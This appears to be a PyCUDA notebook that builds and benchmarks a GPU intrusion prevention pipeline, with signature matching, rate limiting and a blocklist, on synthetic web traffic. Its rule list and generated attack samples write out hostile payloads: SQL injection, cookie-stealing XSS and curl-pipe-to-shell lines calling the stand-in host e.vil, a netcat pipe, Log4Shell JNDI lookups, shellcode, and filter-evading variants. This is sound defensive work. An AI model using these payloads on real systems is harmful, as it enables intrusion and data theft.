# %% [markdown]
# # GPU-Accelerated Attack Prevention with PyCUDA
#
# A batch of network packets goes through three GPU stages:
#
# 1. **Signature inspection**: every packet payload is scanned for known attack strings
#    (SQL injection, XSS, path traversal, command injection, Log4Shell, shellcode)
#    using an Aho-Corasick automaton. One CUDA thread per packet.
# 2. **Rate analysis**: packets and login attempts are counted per source IP with atomic adds,
#    which catches floods (DoS) and password brute forcing.
# 3. **Policy**: each packet gets a verdict, ALLOW or DROP, and abusive sources are
#    added to a blocklist that is applied to the next batch.
#
# The same work is also done on the CPU so speed and correctness can be compared.
#
# Runtime: Google Colab, Runtime > Change runtime type > T4 GPU.

# %%
# !pip install -q pycuda

# %%
import time, json, os
import numpy as np

try:
    import pycuda.autoinit
    import pycuda.driver as cuda
    from pycuda.compiler import SourceModule
    HAVE_GPU = True
    print("GPU:", cuda.Device(0).name())
except Exception as e:  # lets the CPU parts run on a machine without CUDA
    HAVE_GPU = False
    print("PyCUDA not available, CPU parts only:", e)

RNG = np.random.default_rng(42)
MAX_LEN = 256          # bytes inspected per packet
os.makedirs("results", exist_ok=True)

# %% [markdown]
# ## 1. Attack signatures
# Each rule is a byte string plus a category. Matching is case insensitive.
# At most 64 rules, so the set of matched rules for a packet fits in one 64-bit mask.

# %%
RULES = [
    # SQL injection
    (b"' or '1'='1", "sqli"), (b"' or 1=1", "sqli"), (b"union select", "sqli"),
    (b"union all select", "sqli"), (b"; drop table", "sqli"), (b"information_schema", "sqli"),
    (b"sleep(", "sqli"), (b"benchmark(", "sqli"), (b"xp_cmdshell", "sqli"), (b"' --", "sqli"),
    # Cross site scripting
    (b"<script", "xss"), (b"javascript:", "xss"), (b"onerror=", "xss"), (b"onload=", "xss"),
    (b"document.cookie", "xss"), (b"<iframe", "xss"), (b"alert(", "xss"), (b"<svg/onload", "xss"),
    # Path traversal / file inclusion
    (b"../../", "traversal"), (b"..%2f", "traversal"), (b"%2e%2e/", "traversal"),
    (b"/etc/passwd", "traversal"), (b"/etc/shadow", "traversal"), (b"c:\\windows\\", "traversal"),
    (b"php://input", "traversal"), (b"file://", "traversal"),
    # Command injection
    (b"; cat ", "cmdi"), (b"| nc ", "cmdi"), (b"$(curl", "cmdi"), (b"`wget", "cmdi"),
    (b"/bin/sh", "cmdi"), (b"/bin/bash", "cmdi"), (b"&& rm -rf", "cmdi"), (b"powershell -enc", "cmdi"),
    # Log4Shell and template injection
    (b"${jndi:", "log4shell"), (b"${${lower:j}", "log4shell"), (b"{{7*7}}", "log4shell"),
    # Shellcode markers
    (b"\x90\x90\x90\x90\x90\x90\x90\x90", "shellcode"), (b"\\x90\\x90\\x90", "shellcode"),
    (b"\x31\xc0\x50\x68", "shellcode"),
]
assert len(RULES) <= 64
CATEGORIES = sorted({c for _, c in RULES})
RULE_CAT = np.array([CATEGORIES.index(c) for _, c in RULES])
print(len(RULES), "rules in", len(CATEGORIES), "categories:", CATEGORIES)

# %% [markdown]
# ## 2. Aho-Corasick automaton
# All rules are merged into one state machine. A full transition table (states x 256)
# is built so the GPU only needs one table lookup per byte, with no branching on failure links.
# `out_mask[s]` holds the rules that end at state `s` (failure outputs included).

# %%
def lower_byte(c):
    return c + 32 if 65 <= c <= 90 else c

def build_automaton(patterns):
    goto = [dict()]
    out = [0]
    for pid, pat in enumerate(patterns):
        s = 0
        for ch in pat:
            ch = lower_byte(ch)
            if ch not in goto[s]:
                goto.append(dict()); out.append(0)
                goto[s][ch] = len(goto) - 1
            s = goto[s][ch]
        out[s] |= 1 << pid
    n_states = len(goto)
    delta = np.zeros((n_states, 256), dtype=np.int32)
    fail = [0] * n_states
    queue = []
    for c in range(256):            # depth 1 states fail to the root
        if c in goto[0]:
            nxt = goto[0][c]; delta[0, c] = nxt; queue.append(nxt)
        else:
            delta[0, c] = 0
    while queue:                    # breadth first so fail[s] is finished before s is used
        s = queue.pop(0)
        out[s] |= out[fail[s]]
        for c in range(256):
            if c in goto[s]:
                nxt = goto[s][c]
                fail[nxt] = delta[fail[s], c]
                delta[s, c] = nxt
                queue.append(nxt)
            else:
                delta[s, c] = delta[fail[s], c]
    return delta, np.array(out, dtype=np.uint64)

DELTA, OUT_MASK = build_automaton([p for p, _ in RULES])
print("automaton states:", DELTA.shape[0], "| table size: %.1f KB" % (DELTA.nbytes / 1024))

# %% [markdown]
# ## 3. Synthetic traffic generator
# Real captures with payloads (and labels) are hard to share, so traffic is generated with
# known ground truth: normal web requests, injected attacks, a few **evasive** attacks that the
# rules do not cover (to measure misses honestly), a flooding source and brute force sources.

# %%
BENIGN = [
    b"GET /index.html HTTP/1.1\r\nHost: shop.example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
    b"GET /products?category=shoes&page=%d HTTP/1.1\r\nHost: shop.example.com\r\n\r\n",
    b"POST /api/cart HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"item\": %d, \"qty\": 2}",
    b"GET /search?q=best+selection+of+union+jackets HTTP/1.1\r\n\r\n",
    b"GET /blog/how-to-script-your-day HTTP/1.1\r\nAccept: text/html\r\n\r\n",
    b"POST /api/comment HTTP/1.1\r\n\r\n{\"text\": \"I will drop by the table tennis club at %d\"}",
    b"GET /static/img/logo.svg HTTP/1.1\r\nCache-Control: no-cache\r\n\r\n",
    b"GET /docs/etc/password-policy HTTP/1.1\r\n\r\n",
]
ATTACKS = {
    "sqli": [b"GET /item?id=1' OR '1'='1 HTTP/1.1\r\n\r\n",
             b"GET /item?id=5 UNION SELECT username,password FROM users HTTP/1.1\r\n\r\n",
             b"POST /login HTTP/1.1\r\n\r\nuser=admin' --&pass=x",
             b"GET /q?id=1; DROP TABLE orders HTTP/1.1\r\n\r\n",
             b"GET /q?id=1 AND SLEEP(5) HTTP/1.1\r\n\r\n"],
    "xss": [b"GET /search?q=<script>alert(1)</script> HTTP/1.1\r\n\r\n",
            b"POST /comment HTTP/1.1\r\n\r\ntext=<img src=x onerror=fetch('//e.vil/'+document.cookie)>",
            b"GET /p?u=javascript:alert(document.domain) HTTP/1.1\r\n\r\n",
            b"GET /x?<svg/onload=confirm(1)> HTTP/1.1\r\n\r\n"],
    "traversal": [b"GET /download?f=../../../../etc/passwd HTTP/1.1\r\n\r\n",
                  b"GET /view?page=..%2f..%2f..%2fetc%2fshadow HTTP/1.1\r\n\r\n",
                  b"GET /inc?file=php://input HTTP/1.1\r\n\r\n"],
    "cmdi": [b"GET /ping?host=8.8.8.8; cat /etc/hosts HTTP/1.1\r\n\r\n",
             b"POST /tools HTTP/1.1\r\n\r\ncmd=ls | nc 10.0.0.9 4444",
             b"GET /run?x=$(curl http://e.vil/s.sh|/bin/sh) HTTP/1.1\r\n\r\n"],
    "log4shell": [b"GET / HTTP/1.1\r\nUser-Agent: ${jndi:ldap://e.vil:1389/a}\r\n\r\n",
                  b"GET / HTTP/1.1\r\nX-Api: ${${lower:j}ndi:ldap://e.vil/x}\r\n\r\n"],
    "shellcode": [b"POST /upload HTTP/1.1\r\n\r\n" + b"\x90" * 40 + b"\x31\xc0\x50\x68//sh"],
}
# Obfuscated variants that the rule set does not contain. These should be missed.
EVASIVE = [b"GET /item?id=5 UN/**/ION SE/**/LECT pass FROM users HTTP/1.1\r\n\r\n",
           b"GET /s?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\r\n\r\n",
           b"GET /dl?f=....//....//etc//passwd HTTP/1.1\r\n\r\n"]

def fill(t):
    return t.replace(b"%d", str(int(RNG.integers(1, 9999))).encode()) if b"%d" in t else t

def generate_traffic(n, n_sources=2000, attack_rate=0.03, evasive_rate=0.003):
    """Returns payload matrix (n x MAX_LEN), lengths, source ids, login flags, true labels."""
    labels, payloads = [], []
    src = RNG.integers(0, n_sources, size=n).astype(np.int32)
    is_login = (RNG.random(n) < 0.02).astype(np.int32)        # normal users log in sometimes
    kinds = RNG.random(n)
    attack_cats = list(ATTACKS)
    for i in range(n):
        if kinds[i] < attack_rate:
            cat = attack_cats[RNG.integers(len(attack_cats))]
            pool = ATTACKS[cat]
            payloads.append(pool[RNG.integers(len(pool))]); labels.append(cat)
        elif kinds[i] < attack_rate + evasive_rate:
            payloads.append(EVASIVE[RNG.integers(len(EVASIVE))]); labels.append("evasive")
        else:
            payloads.append(fill(BENIGN[RNG.integers(len(BENIGN))])); labels.append("benign")
    labels = np.array(labels, dtype=object)

    # Source 0 floods (8% of all packets). Sources 1..3 hammer the login endpoint.
    flood_idx = RNG.choice(n, size=int(0.08 * n), replace=False)
    src[flood_idx] = 0
    labels[flood_idx[labels[flood_idx] == "benign"]] = "flood"
    brute_idx = RNG.choice(np.setdiff1d(np.arange(n), flood_idx), size=int(0.01 * n), replace=False)
    src[brute_idx] = RNG.integers(1, 4, size=len(brute_idx))
    is_login[brute_idx] = 1
    for i in brute_idx:
        if labels[i] == "benign":
            payloads[i] = b"POST /login HTTP/1.1\r\n\r\nuser=admin&pass=guess%d" % RNG.integers(1e6)
            labels[i] = "bruteforce"
    # Honest users never share ids with the attackers
    honest = ~np.isin(np.arange(n), np.concatenate([flood_idx, brute_idx]))
    src[honest & (src < 4)] += 4

    mat = np.zeros((n, MAX_LEN), dtype=np.uint8)
    lens = np.zeros(n, dtype=np.int32)
    for i, p in enumerate(payloads):
        p = p[:MAX_LEN]
        mat[i, :len(p)] = np.frombuffer(p, dtype=np.uint8)
        lens[i] = len(p)
    return mat, lens, src, is_login, labels

# %% [markdown]
# ## 4. CUDA kernels
# * `ac_match_rowmajor`: thread *i* reads packet *i* byte by byte. Neighbouring threads read
#   addresses `MAX_LEN` bytes apart, so memory reads are **not coalesced**.
# * `ac_match_colmajor`: the payload matrix is transposed first, so at step *k* the threads of a
#   warp read 32 consecutive bytes. Same algorithm, coalesced reads.
# * `count_sources`: per-source packet and login counters using `atomicAdd`.
# * `apply_policy`: final verdict for every packet.

# %%
KERNELS = r"""
__device__ __forceinline__ unsigned char to_lower(unsigned char c) {
    return (c >= 'A' && c <= 'Z') ? c + 32 : c;
}

__global__ void ac_match_rowmajor(const unsigned char* __restrict__ payload,
                                  const int* __restrict__ lens, int max_len,
                                  const int* __restrict__ delta,
                                  const unsigned long long* __restrict__ out_mask,
                                  unsigned long long* result, int n)
{
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    if (i >= n) return;
    const unsigned char* p = payload + (size_t)i * max_len;
    int len = lens[i];
    int s = 0;
    unsigned long long m = 0ULL;
    for (int k = 0; k < len; k++) {
        s = delta[s * 256 + to_lower(p[k])];
        m |= out_mask[s];
    }
    result[i] = m;
}

__global__ void ac_match_colmajor(const unsigned char* __restrict__ payload_t,
                                  const int* __restrict__ lens, int max_len,
                                  const int* __restrict__ delta,
                                  const unsigned long long* __restrict__ out_mask,
                                  unsigned long long* result, int n)
{
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    if (i >= n) return;
    int len = lens[i];
    int s = 0;
    unsigned long long m = 0ULL;
    for (int k = 0; k < len; k++) {
        s = delta[s * 256 + to_lower(payload_t[(size_t)k * n + i])];
        m |= out_mask[s];
    }
    result[i] = m;
}

__global__ void count_sources(const int* __restrict__ src, const int* __restrict__ is_login,
                              int* pkt_count, int* login_count, int n)
{
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    if (i >= n) return;
    atomicAdd(&pkt_count[src[i]], 1);
    if (is_login[i]) atomicAdd(&login_count[src[i]], 1);
}

/* verdict: 0 = ALLOW, 1 = DROP (signature), 2 = DROP (source blocked)
   blocked[src] is set here for sources over a threshold and read by the host for the next batch */
__global__ void apply_policy(const unsigned long long* __restrict__ sig_result,
                             const int* __restrict__ src,
                             const int* __restrict__ pkt_count, const int* __restrict__ login_count,
                             const int* __restrict__ prev_blocked,
                             int flood_limit, int login_limit,
                             int* blocked, unsigned char* verdict, int n)
{
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    if (i >= n) return;
    int s = src[i];
    int over = pkt_count[s] > flood_limit || login_count[s] > login_limit;
    if (over) blocked[s] = 1;
    if (sig_result[i] != 0ULL) verdict[i] = 1;
    else if (over || prev_blocked[s]) verdict[i] = 2;
    else verdict[i] = 0;
}
"""

THREADS = 256

if HAVE_GPU:
    mod = SourceModule(KERNELS)
    k_row = mod.get_function("ac_match_rowmajor")
    k_col = mod.get_function("ac_match_colmajor")
    k_count = mod.get_function("count_sources")
    k_policy = mod.get_function("apply_policy")
    d_delta = cuda.to_device(DELTA.ravel())
    d_out = cuda.to_device(OUT_MASK)

# %% [markdown]
# ## 5. GPU pipeline
# Times are measured with CUDA events. Transfer time (host to device and back) is reported
# separately from kernel time, because in a real deployment it is part of the cost.

# %%
def gpu_pipeline(mat, lens, src, is_login, n_sources, flood_limit, login_limit,
                 prev_blocked=None, layout="col"):
    n = len(lens)
    if prev_blocked is None:
        prev_blocked = np.zeros(n_sources, dtype=np.int32)
    grid = ((n + THREADS - 1) // THREADS, 1)
    block = (THREADS, 1, 1)
    ev = [cuda.Event() for _ in range(4)]

    ev[0].record()
    payload_host = np.ascontiguousarray(mat.T) if layout == "col" else mat
    d_pay = cuda.to_device(payload_host)
    d_lens = cuda.to_device(lens); d_src = cuda.to_device(src); d_login = cuda.to_device(is_login)
    d_prev = cuda.to_device(prev_blocked)
    d_res = cuda.mem_alloc(n * 8)
    d_pc = cuda.to_device(np.zeros(n_sources, np.int32))
    d_lc = cuda.to_device(np.zeros(n_sources, np.int32))
    d_blk = cuda.to_device(np.zeros(n_sources, np.int32))
    d_ver = cuda.mem_alloc(n)
    ev[1].record()

    kern = k_col if layout == "col" else k_row
    kern(d_pay, d_lens, np.int32(MAX_LEN), d_delta, d_out, d_res, np.int32(n), block=block, grid=grid)
    k_count(d_src, d_login, d_pc, d_lc, np.int32(n), block=block, grid=grid)
    k_policy(d_res, d_src, d_pc, d_lc, d_prev, np.int32(flood_limit), np.int32(login_limit),
             d_blk, d_ver, np.int32(n), block=block, grid=grid)
    ev[2].record()

    sig = np.empty(n, np.uint64); cuda.memcpy_dtoh(sig, d_res)
    verdict = np.empty(n, np.uint8); cuda.memcpy_dtoh(verdict, d_ver)
    blocked = np.empty(n_sources, np.int32); cuda.memcpy_dtoh(blocked, d_blk)
    pkt_count = np.empty(n_sources, np.int32); cuda.memcpy_dtoh(pkt_count, d_pc)
    ev[3].record(); ev[3].synchronize()

    times = {"h2d_ms": ev[0].time_till(ev[1]), "kernel_ms": ev[1].time_till(ev[2]),
             "d2h_ms": ev[2].time_till(ev[3]), "total_ms": ev[0].time_till(ev[3])}
    for d in (d_pay, d_lens, d_src, d_login, d_prev, d_res, d_pc, d_lc, d_blk, d_ver):
        d.free()
    return sig, verdict, blocked, pkt_count, times

# %% [markdown]
# ## 6. CPU baseline
# The CPU version uses Python's built in substring search (`in`), which runs in optimised C,
# once per rule per packet. Rate counting uses `np.bincount`. This is a fair, simple baseline,
# not a deliberately slow one.

# %%
LOWER_RULES = [p.lower() for p, _ in RULES]

def cpu_pipeline(mat, lens, src, is_login, n_sources, flood_limit, login_limit, prev_blocked=None):
    n = len(lens)
    if prev_blocked is None:
        prev_blocked = np.zeros(n_sources, dtype=np.int32)
    t0 = time.perf_counter()
    sig = np.zeros(n, dtype=np.uint64)
    for i in range(n):
        data = mat[i, :lens[i]].tobytes().lower()
        m = 0
        for pid, pat in enumerate(LOWER_RULES):
            if pat in data:
                m |= 1 << pid
        sig[i] = m
    t1 = time.perf_counter()
    pkt_count = np.bincount(src, minlength=n_sources).astype(np.int32)
    login_count = np.bincount(src, weights=is_login, minlength=n_sources).astype(np.int32)
    over = (pkt_count > flood_limit) | (login_count > login_limit)
    verdict = np.where(sig != 0, 1, np.where(over[src] | (prev_blocked[src] > 0), 2, 0)).astype(np.uint8)
    t2 = time.perf_counter()
    return sig, verdict, over.astype(np.int32), pkt_count, {
        "match_ms": (t1 - t0) * 1e3, "rate_policy_ms": (t2 - t1) * 1e3, "total_ms": (t2 - t0) * 1e3}

# %% [markdown]
# ## 7. Correctness check
# GPU and CPU must agree exactly on every packet's rule mask and verdict.

# %%
N_SOURCES = 2000
def limits(n):
    # Average honest source sends n / N_SOURCES packets. Allow 5x that before calling it a flood.
    return max(20, int(5 * n / N_SOURCES)), 15

n = 50_000
mat, lens, src, is_login, labels = generate_traffic(n, N_SOURCES)
fl, ll = limits(n)
c_sig, c_ver, c_blk, _, c_t = cpu_pipeline(mat, lens, src, is_login, N_SOURCES, fl, ll)
print("CPU: %.1f ms" % c_t["total_ms"])
if HAVE_GPU:
    for layout in ("row", "col"):
        g_sig, g_ver, g_blk, _, g_t = gpu_pipeline(mat, lens, src, is_login, N_SOURCES, fl, ll, layout=layout)
        ok = np.array_equal(g_sig, c_sig) and np.array_equal(g_ver, c_ver) and np.array_equal(g_blk, c_blk)
        print(f"GPU {layout}-major matches CPU: {ok} | kernel {g_t['kernel_ms']:.2f} ms, total {g_t['total_ms']:.2f} ms")
        assert ok

# %% [markdown]
# ## 8. Detection quality
# Per traffic type: what share of packets was dropped. Benign should be close to 0%,
# real attacks close to 100%, evasive attacks show the limit of signature matching.

# %%
def detection_table(verdict, labels):
    rows = []
    for lab in ["benign", "sqli", "xss", "traversal", "cmdi", "log4shell", "shellcode",
                "flood", "bruteforce", "evasive"]:
        sel = labels == lab
        if sel.sum() == 0:
            continue
        rows.append((lab, int(sel.sum()), float((verdict[sel] > 0).mean() * 100)))
    return rows

verdict = g_ver if HAVE_GPU else c_ver
table = detection_table(verdict, labels)
print(f"{'traffic':<12}{'packets':>9}{'dropped %':>11}")
for lab, cnt, pct in table:
    print(f"{lab:<12}{cnt:>9}{pct:>10.1f}%")

attack = labels != "benign"
tp = int(((verdict > 0) & attack).sum()); fp = int(((verdict > 0) & ~attack).sum())
fn = int(((verdict == 0) & attack).sum()); tn = int(((verdict == 0) & ~attack).sum())
precision = tp / max(tp + fp, 1); recall = tp / max(tp + fn, 1)
print(f"\nprecision {precision:.4f} | recall {recall:.4f} | false positive rate {fp / max(fp + tn, 1):.4f}")

# %% [markdown]
# ## 9. Benchmark: CPU vs GPU across batch sizes

# %%
sizes = [10_000, 50_000, 100_000, 250_000, 500_000]
bench = []
for n in sizes:
    mat, lens, src, is_login, labels = generate_traffic(n, N_SOURCES)
    fl, ll = limits(n)
    _, _, _, _, c_t = cpu_pipeline(mat, lens, src, is_login, N_SOURCES, fl, ll)
    row = {"n": n, "cpu_ms": c_t["total_ms"]}
    if HAVE_GPU:
        gpu_pipeline(mat[:1000], lens[:1000], src[:1000], is_login[:1000], N_SOURCES, fl, ll)  # warm up
        for layout in ("row", "col"):
            runs = [gpu_pipeline(mat, lens, src, is_login, N_SOURCES, fl, ll, layout=layout)[4] for _ in range(3)]
            row[f"gpu_{layout}_kernel_ms"] = float(np.median([r["kernel_ms"] for r in runs]))
            row[f"gpu_{layout}_total_ms"] = float(np.median([r["total_ms"] for r in runs]))
    bench.append(row)
    print(row)

with open("results/benchmark.json", "w") as f:
    json.dump({"bench": bench, "detection": table, "precision": precision, "recall": recall,
               "gpu": cuda.Device(0).name() if HAVE_GPU else None}, f, indent=2)

# %%
import matplotlib.pyplot as plt

ns = [b["n"] for b in bench]
fig, ax = plt.subplots(1, 2, figsize=(12, 4.5))
ax[0].plot(ns, [b["cpu_ms"] for b in bench], "o-", label="CPU")
if HAVE_GPU:
    ax[0].plot(ns, [b["gpu_row_total_ms"] for b in bench], "s-", label="GPU row-major (incl. transfer)")
    ax[0].plot(ns, [b["gpu_col_total_ms"] for b in bench], "^-", label="GPU col-major (incl. transfer)")
ax[0].set_xlabel("packets per batch"); ax[0].set_ylabel("time (ms)"); ax[0].set_yscale("log")
ax[0].set_title("Inspection time"); ax[0].legend(); ax[0].grid(alpha=.3)
if HAVE_GPU:
    ax[1].bar([str(n // 1000) + "k" for n in ns], [b["cpu_ms"] / b["gpu_col_total_ms"] for b in bench],
              label="end to end")
    ax[1].plot([str(n // 1000) + "k" for n in ns], [b["cpu_ms"] / b["gpu_col_kernel_ms"] for b in bench],
               "ko-", label="kernel only")
    ax[1].set_ylabel("speedup over CPU (x)"); ax[1].set_title("GPU speedup (col-major)"); ax[1].legend()
plt.tight_layout(); plt.savefig("results/benchmark.png", dpi=200); plt.show()

fig, ax = plt.subplots(figsize=(7, 4))
ax.barh([r[0] for r in table], [r[2] for r in table])
ax.set_xlabel("packets dropped (%)"); ax.set_xlim(0, 100); ax.set_title("Detection by traffic type")
plt.tight_layout(); plt.savefig("results/detection.png", dpi=200); plt.show()

# %% [markdown]
# ## 10. Prevention across batches
# The blocklist from batch *t* is passed into batch *t+1*, so a flooding source is
# dropped from its first packet in the next window instead of after it crosses the limit again.

# %%
if HAVE_GPU:
    blocked = None
    for t in range(3):
        mat, lens, src, is_login, labels = generate_traffic(100_000, N_SOURCES)
        fl, ll = limits(100_000)
        _, ver, new_blk, pc, tm = gpu_pipeline(mat, lens, src, is_login, N_SOURCES, fl, ll, prev_blocked=blocked)
        blocked = new_blk if blocked is None else np.maximum(blocked, new_blk)
        print(f"batch {t}: allowed {(ver == 0).sum()}, dropped by signature {(ver == 1).sum()}, "
              f"dropped by rate/blocklist {(ver == 2).sum()}, blocklist = {np.flatnonzero(blocked).tolist()}, "
              f"{tm['total_ms']:.1f} ms")
